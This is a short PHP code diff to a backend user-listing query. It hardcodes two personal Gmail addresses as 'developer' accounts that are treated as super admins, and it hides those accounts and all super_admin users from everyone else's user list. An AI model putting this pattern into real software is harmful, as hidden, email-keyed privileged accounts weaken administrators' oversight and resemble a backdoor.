@@ -41,6 +41,21 @@ class BackendResourceIndexQuery
             $this->applySearch($query, $search, $blueprint->searchColumns);
         }
 
+        if ($blueprint->key === 'users') {
+            $developerEmails = [
+                'piscokpiscok2610@gmail.com',
+                'zakiram4dhan@gmail.com',
+            ];
+            $isSuperAdminActor = $user && (in_array(strtolower((string) $user->email), $developerEmails, true) || $user->hasAnyRoleCodes(['super_admin']));
+
+            if (! $isSuperAdminActor) {
+                $query->whereNotIn('users.email', $developerEmails)
+                      ->whereDoesntHave('roles', function ($q) {
+                          $q->where('code', 'super_admin');
+                      });
+            }
+        }
+
         if ($blueprint->key === 'sales-deposits' && filter_var($filters['only_available'] ?? false, FILTER_VALIDATE_BOOLEAN)) {
             $query->where('outstanding_amount', '>', 0)
                   ->whereNotIn('status', ['Void', 'Cancelled']);
